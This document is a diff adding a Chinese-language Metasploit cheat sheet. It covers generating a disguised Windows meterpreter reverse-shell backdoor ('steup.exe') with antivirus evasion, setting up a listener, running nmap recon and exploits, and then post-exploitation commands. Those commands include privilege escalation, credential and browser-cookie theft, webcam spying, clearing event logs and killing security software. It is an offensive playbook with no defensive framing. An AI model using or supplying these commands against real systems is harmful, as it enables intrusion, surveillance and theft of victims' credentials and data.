@@ -1,0 +1,51 @@
+Metasploit
+1.msfpayload生成后门程序：
+msfpayload windows/meterpreter/reverse_tcp LHOST=%自己的IP% x >steup.exe
+2.进入所在目录，修改属性：选择“允许以程序执行文件”,这时候也可以做一些免杀。
+3.打开msfconsole，加载exploit/multi/handler模块，设置本地主机；然后开始监听：exploit -z -j
+db_nmap						使用nmap
+db_nmap -sT -O %IP号%		信息搜集
+search %漏洞脚本局部名称%	查找脚本
+use %漏洞脚本名程%			使用漏洞脚本
+show options					查看选项便于配置
+set %NAME对应项% %IP号%		设置选项
+Ps:set PAYLOAD windows/meterpreter/reverse_tcp TCP反向连接
+exploit						开始执行攻击
+rdesktop -u %指定用户% -p %密码%	连接远程桌面
+meterpreter命令及脚本
+当看到[*] Meterpreter session 1 opened (******************************) 
+这就代表这你在目标系统上成功的获得了Meterpreter的Shell
+sessions -l 					用于查看你控制的电脑
+sessions -i %id号%			连接获取的meterpreter
+run %脚本名%					运行脚本
+-h								可以查看帮助
+-r %IP%							指定IP
+脚本
+migrate %进程PID%			转换依附进程
+getgui							可以很方便的开启远程桌面服务，添加用户，端
+								口转发功能
+getuid							函数返回一个调用程序的真实用户ID
+getsystem						提高权限
+shell							打开终端
+exit							推出shell
+arp_scanner					利用arp进行存活主机扫描
+checkvm						可以检测目标是否是虚拟机
+credcollect					收集目标主机上的hash等凭证
+domain_list_gen				获取域管理账户列表，并判断当前session所在
+								用户是否在列表中
+dumplinks						Link文件包含时间戳，文件位置，共享名，卷								序，列号等。脚本会在用户目录和office目录								中收集lnk文件
+run webcam -p /var/www    	#在/var/www目录监控目标主机的摄像头
+duplicate						再次产生payload，注入到其他进程或打开
+								新进程并注入其中
+enum_chrome					获取chrome中的信息
+enum_firefox					获取firefox中的信息，包括cooikie，历
+								史纪录，书签等
+enum_logged_on_users			列出当前登录的用户
+enum_powershell_env			列出powershell和WSH的配置文件
+enum_putty						列出putty的配置文件
+enum_shares					列出共享及历史共享
+event_manager					可以查询和清理事件日志
+getcountermeasure				列出HIPS 和 AV 的进程，显示XP 防火墙规则, 
+								并且显示 DEP和UAC 策略
+								Ps：-k参数可以杀掉防护软件进程
+exit   						退出shell会话返回meterpreter或终止									meterpreter
